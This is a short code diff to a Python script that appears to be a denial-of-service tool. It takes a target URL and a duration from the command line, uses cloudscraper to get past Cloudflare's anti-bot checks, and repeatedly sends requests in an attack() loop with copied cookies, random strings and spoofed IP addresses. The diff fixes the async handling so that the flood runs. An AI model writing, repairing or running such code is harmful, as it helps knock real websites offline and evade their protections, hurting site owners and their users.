@@ -4,6 +4,7 @@ import sys
 import random
 import string
 import time
+import asyncio
 
 url = sys.argv[1]
 time_interval = int(sys.argv[2])
@@ -19,12 +20,12 @@ async def random_string_generate(length):
     characters = string.ascii_lowercase + string.digits
     return ''.join(random.choice(characters) for i in range(length))
 
-def attack():
+async def attack():
     scraper = cloudscraper.create_scraper()
     try:
         response = scraper.get(url)
         cookie = response.cookies.get_dict()
-        user_agent = response.request.headers['User-Agent']
+        user_agent = response.request.headers.get('User-Agent', 'Mozilla/5.0')
 
         random_string = await random_string_generate(10)
         fake_ip = f'{random_byte()}.{random_byte()}.{random_byte()}.{random_byte()}'
@@ -44,12 +45,12 @@ def attack():
     except Exception as e:
         print('Failed to get website data:', e)
 
-def main():
+async def main():
     interval = time_interval
     start_time = time.time()
 
     while time.time() - start_time <= interval:
-        attack()
+        await attack()
 
 if __name__ == '__main__':
-    main()
+    asyncio.run(main())
